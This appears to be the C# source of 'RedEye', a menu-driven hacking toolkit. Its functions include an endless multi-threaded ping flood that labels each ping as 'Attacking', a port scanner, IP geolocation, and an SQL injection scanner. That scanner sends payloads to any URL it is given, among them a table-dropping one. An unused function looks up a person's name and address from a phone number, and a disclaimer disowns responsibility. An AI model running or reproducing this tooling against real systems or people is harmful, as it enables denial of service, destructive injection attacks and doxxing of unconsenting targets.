using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;

class Redeye
{
    static int concurrencyLevel = 10;

    static async Task Main(string[] args)
    {
        while (true)
        {
            Console.Clear();
            Console.Title = "RedEye ︱Made by aapoxi";
            Console.ForegroundColor = ConsoleColor.DarkRed;

            string[] banner = new[]
            {
            " ██▀███  ▓█████ ▓█████▄ ▓█████▓██   ██▓▓█████ ",
            "▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓█   ▀ ▒██  ██▒▓█   ▀ ",
            "▓██ ░▄█ ▒▒███   ░██   █▌▒███    ▒██ ██░▒███   ",
            "▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌▒▓█  ▄  ░ ▐██▓░▒▓█  ▄ ",
            "░██▓ ▒██▒░▒████▒░▒████▓ ░▒████▒ ░ ██▒▓░░▒████▒",
            "░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░░ ▒░ ░  ██▒▒▒ ░░ ▒░ ░",
            "  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒  ░ ░  ░▓██ ░▒░  ░ ░  ░",
            "  ░░   ░    ░    ░ ░  ░    ░   ▒ ▒ ░░     ░   ",
            "   ░        ░  ░   ░       ░  ░░ ░        ░  ░",
            "                 ░             ░ ░            "
            };

            CenterTextBlock(banner);

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\nSelect a tool:");
            PrintOption("[0]", " - Tools info");
            PrintOption("[1]", " - IP Pinger");
            PrintOption("[2]", " - IP Lookup");
            PrintOption("[3]", " - IP Scanner");
            PrintOption("[4]", " - Website scanner");
            PrintOption("[5]", " - SQL Vulnerability");
           

            Console.Write("\nEnter option number: ");
            string option = Console.ReadLine();

            switch (option)
            {
                case "0":
                    await ShowInfo(banner);
                    break;

                case "1":
                    CenterTextBlock(banner);
                    await IpPinger();
                    break;

                case "2":
                    CenterTextBlock(banner);
                    await IpLookup();
                    break;

                case "3":
                    await IpScanner();
                    break;

                case "4":
                    await WebsiteScanner();
                    break;

                case "5":
                    await SqlInjectionScanner();
                    break;

         

                default:
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.WriteLine("Invalid option. Press any key to try again...");
                    Console.ReadKey();
                    break;
            }
        }
    }
    
    static async Task WebsiteScanner()
    {
        Console.Clear();
        Console.Write("Enter website URL: ");
        string url = Console.ReadLine().Trim();


        if (Uri.IsWellFormedUriString(url, UriKind.Absolute))
        {
            try
            {

                Uri uri = new Uri(url);
                string domain = uri.Host;


                var ipHostEntry = Dns.GetHostEntry(domain);
                string ipAddress = ipHostEntry.AddressList[0].ToString();

                Console.WriteLine($"IP Address       : {ipAddress}");


                using var client = new HttpClient();
                string apiUrl = $"http://ip-api.com/json/{ipAddress}";
                string response = await client.GetStringAsync(apiUrl);

                var geoData = JsonSerializer.Deserialize<GeoData>(response);

                if (geoData != null && geoData.status == "success")
                {
                    Console.WriteLine($"Country      : {geoData.country}");
                    Console.WriteLine($"Region       : {geoData.regionName}");
                    Console.WriteLine($"City         : {geoData.city}");
                    Console.WriteLine($"ZIP Code     : {geoData.zip}");
                    Console.WriteLine($"ISP          : {geoData.isp}");
                    Console.WriteLine($"Org          : {geoData.org}");
                    Console.WriteLine($"AS           : {geoData.@as}");
                    Console.WriteLine($"Latitude     : {geoData.lat}");
                    Console.WriteLine($"Longitude    : {geoData.lon}");
                }
                else
                {
                    Console.WriteLine("Failed to retrieve geolocation data.");
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine($"Error retrieving information: {ex.Message}");
            }
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("Invalid URL format. Please make sure the URL is correct.");
        }
        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.WriteLine("Press ESC to return...");
        WaitForEscape();
    }

    static async Task SqlInjectionScanner()
    {
        Console.Clear();
        Console.Write("Enter target URL (with a parameter, e.g., http://site.com/page.php?id=1): ");
        string baseUrl = Console.ReadLine();

        string[] sqlPayloads = new[]
        {
            "' OR '1'='1",
            "' OR 'a'='a",
            "'; DROP TABLE users; --",
            "1 UNION SELECT null, version()--",
            "' AND SLEEP(5) --"
        };

        foreach (var payload in sqlPayloads)
        {
            string testUrl = $"{baseUrl}{HttpUtility.UrlEncode(payload)}";
            try
            {
                using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
                string content = await client.GetStringAsync(testUrl);

                if (Regex.IsMatch(content, "(sql syntax|mysql_fetch|native client|ORA-)", RegexOptions.IgnoreCase))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[!] Possible SQL Injection detected with payload: {payload}");
                    Console.ResetColor();
                }
                else
                {
                    Console.WriteLine($"[-] Tested payload: {payload} - No issues detected.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error testing payload '{payload}': {ex.Message}");
            }
        }
        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.WriteLine("Press ESC to return...");
        WaitForEscape();
    }
    static async Task ShowInfo(string[] banner)
    {
        Console.Clear();
        Console.ForegroundColor = ConsoleColor.DarkRed;
        CenterTextBlock(banner);
        Console.WriteLine("Me, the creator of this tool is not responsible for anything you do with this tool!");
        Console.WriteLine("");
        Console.WriteLine("\nPress ESC to return...");
        WaitForEscape();
    }

    static async Task IpPinger()
    {
        Console.Clear();
        Console.Write("Enter IP address: ");
        string input = Console.ReadLine();
        var targetIps = input.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);


        foreach (var ip in targetIps)
        {
            Console.WriteLine($"- {ip}");
        }
        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.WriteLine("Press ESC to return...");

        var allTasks = new Task[targetIps.Length * concurrencyLevel];
        int index = 0;

        foreach (var target in targetIps)
        {
            for (int i = 0; i < concurrencyLevel; i++)
            {
                string targetIp = target;
                allTasks[index++] = Task.Run(() => SendPingsForever(targetIp));
            }
        }

        await Task.WhenAny(Task.WhenAll(allTasks), Task.Run(WaitForEscape));
    }

    static async Task IpLookup()
    {
        Console.Clear();

        Console.Write("Enter IP address: ");
        string target = Console.ReadLine()?.Trim();

        if (!IPAddress.TryParse(target, out IPAddress ipAddress))
        {
            Console.WriteLine("Invalid IP address format. Press ESC to return...");
            WaitForEscape();
            return;
        }



        if (IsPrivateIP(ipAddress))
        {
            Console.WriteLine("IP Type        : Private (No Geolocation Available)");
            Console.WriteLine("\nPress ESC to return...");
            WaitForEscape();
            return;
        }
        else
        {
            Console.WriteLine("IP Type        : Public");


            try
            {
                using var httpClient = new HttpClient();
                string apiUrl = $"http://ip-api.com/json/{target}";
                string response = await httpClient.GetStringAsync(apiUrl);

                var geoData = System.Text.Json.JsonSerializer.Deserialize<GeoData>(response);

                if (geoData != null && geoData.status == "success")
                {
                    Console.WriteLine($"Country      : {geoData.country}");
                    Console.WriteLine($"Region       : {geoData.regionName}");
                    Console.WriteLine($"City         : {geoData.city}");
                    Console.WriteLine($"ZIP Code     : {geoData.zip}");
                    Console.WriteLine($"ISP          : {geoData.isp}");
                    Console.WriteLine($"Org          : {geoData.org}");
                    Console.WriteLine($"AS           : {geoData.@as}");
                    Console.WriteLine($"Latitude     : {geoData.lat}");
                    Console.WriteLine($"Longitude    : {geoData.lon}");
                }
                else
                {
                    Console.WriteLine("Failed to retrieve geolocation data.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error fetching geolocation: {ex.Message}");
            }
        }

        Console.WriteLine("\nPress ESC to return...");
        WaitForEscape();
    }

    static bool IsPrivateIP(IPAddress ipAddress)
    {
        byte[] bytes = ipAddress.GetAddressBytes();

        if (ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
        {
            return (bytes[0] == 10) ||
                   (bytes[0] == 172 && bytes[1] >= 16 && bytes[1] <= 31) ||
                   (bytes[0] == 192 && bytes[1] == 168);
        }
        else if (ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)
        {
            return bytes[0] == 0xFD || bytes[0] == 0xFC;
        }

        return false;
    }


    class GeoData
    {
        public string status { get; set; }
        public string country { get; set; }
        public string regionName { get; set; }
        public string city { get; set; }
        public string zip { get; set; }
        public string isp { get; set; }
        public string org { get; set; }
        public string @as { get; set; }
        public double lat { get; set; }
        public double lon { get; set; }
    }





    static async Task IpScanner()
    {
        Console.Clear();
        Console.Write("Enter target IP: ");
        string targetIp = Console.ReadLine();

        Console.Write("Enter starting port: ");
        int startPort = int.Parse(Console.ReadLine());

        Console.Write("Enter ending port: ");
        int endPort = int.Parse(Console.ReadLine());

        Console.WriteLine($"\nScanning {targetIp} ports {startPort}-{endPort}...");


        var tasks = new Task[endPort - startPort + 1];
        for (int port = startPort; port <= endPort; port++)
        {
            int currentPort = port;
            tasks[port - startPort] = Task.Run(() => ScanPort(targetIp, currentPort));
        }

        await Task.WhenAny(Task.WhenAll(tasks), Task.Run(WaitForEscape));
    }


    static void WaitForEscape()
    {
        while (true)
        {
            if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Escape)
            {
                break;
            }
        }
    }


    static void CenterTextBlock(string[] textBlock)
    {
        int consoleWidth = Console.WindowWidth;

        foreach (string line in textBlock)
        {
            int padding = (consoleWidth - line.Length) / 2;
            Console.WriteLine(new string(' ', Math.Max(padding, 0)) + line);
        }
    }


    static void PrintOption(string number, string description)
    {
        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.Write(number);
        Console.ForegroundColor = ConsoleColor.White;
        Console.WriteLine(description);
    }

    static void ScanPort(string ip, int port)
    {
        const string redeye = "\u001b[31m[Redeye]\u001b[0m";
        try
        {
            using var tcpClient = new System.Net.Sockets.TcpClient();
            var result = tcpClient.BeginConnect(ip, port, null, null);
            bool success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(1));

            if (success && tcpClient.Connected)
            {
                Console.WriteLine($"{redeye} Port {port} is OPEN");
            }
            else
            {
                Console.WriteLine($"{redeye} Port {port} is CLOSED");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"{redeye} Port {port} scan error: {ex.Message}");
        }
        Console.WriteLine("\nPress ESC to return...");
        WaitForEscape();

    }
    static void SendPingsForever(string targetIp)
    {
        Ping ping = new Ping();
        const string redeye = "\u001b[31m[Redeye]\u001b[0m";

        while (true)
        {
            try
            {
                PingReply reply = ping.Send(targetIp, 1000);

                if (reply.Status == IPStatus.Success)
                {
                    Console.WriteLine($"{redeye} Attacking {reply.Address}: time={reply.RoundtripTime}ms");
                }
                else
                {
                    Console.WriteLine($"{redeye} Attack failed: {reply.Status}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"{redeye} Attack error: {ex.Message}");
            }
        }
    }
    // Latest update:

    static async Task LookupPhoneNumber(string phoneNumber)
    {
        string apiKey = "your-api-key";  // Replace with your actual API key
        string apiUrl = $"https://proapi.whitepages.com/3.0/phone?phone_number={phoneNumber}&api_key={apiKey}";

        try
        {
            using var client = new HttpClient();
            var response = await client.GetStringAsync(apiUrl);

            // Assuming the API returns JSON with the information you need
            var lookupData = JsonSerializer.Deserialize<PhoneLookupResponse>(response);

            if (lookupData != null && lookupData.Status == "Success")
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"Name: {lookupData.Name}");
                Console.WriteLine($"Address: {lookupData.Address}");
                Console.WriteLine($"Carrier: {lookupData.Carrier}");
                Console.WriteLine($"Phone Number: {lookupData.PhoneNumber}");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Could not find details for the provided phone number.");
            }
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"Error fetching data: {ex.Message}");
        }
    }
    public class PhoneLookupResponse
    {
        public string Status { get; set; }
        public string Name { get; set; }
        public string Address { get; set; }
        public string Carrier { get; set; }
        public string PhoneNumber { get; set; }
    }



}
